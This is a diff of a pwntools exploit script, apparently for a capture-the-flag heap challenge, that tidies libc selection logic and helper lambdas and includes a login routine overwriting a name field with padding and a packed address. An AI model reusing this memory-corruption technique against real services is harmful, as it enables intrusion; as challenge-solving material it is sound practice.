@@ -9,12 +9,10 @@ remote_port=20002
 
 if uselibc==2 and haslibc==0:
     libc=ELF('/lib/x86_64-linux-gnu/libc-2.23.so')
-else:
-    if uselibc==1 and haslibc==0:
-        libc=ELF('/lib/i386-linux-gnu/libc-2.23.so')
-    else:
-        if haslibc!=0:
-            libc=ELF('./libc.so.6')
+elif uselibc==1 and haslibc==0:
+    libc=ELF('/lib/i386-linux-gnu/libc-2.23.so')
+if haslibc!=0:
+    libc=ELF('./libc.so.6')
 
 if local==1:
     if haslibc:
@@ -31,7 +29,7 @@ else:
 ru = lambda x : p.recvuntil(x)
 sn = lambda x : p.send(x)
 rl = lambda   : p.recvline()
-sl = lambda x : p.sendline(x) 
+sl = lambda x : p.sendline(x)
 rv = lambda x : p.recv(x)
 sa = lambda a,b : p.sendafter(a,b)
 sla = lambda a,b : p.sendlineafter(a,b)
@@ -39,7 +37,7 @@ def lg(s,addr):
     print('\033[1;31;40m%20s-->0x%x\033[0m'%(s,addr))
 
 def raddr(a,l=None):
-    if l==None:
+    if l is None:
         return u64(rv(a).ljust(8,'\x00'))
     else:
         return u64(rl().strip('\n').ljust(8,'\x00'))
@@ -58,7 +56,7 @@ def free(idx):
 
 def login(addr):
     choice(3)
-    sla('name\n','A'*8+p64(addr)[0:7])
+    sla('name\n', 'A'*8 + p64(addr)[:7])
     sla('admin\n',str(1))
 
 def hack():
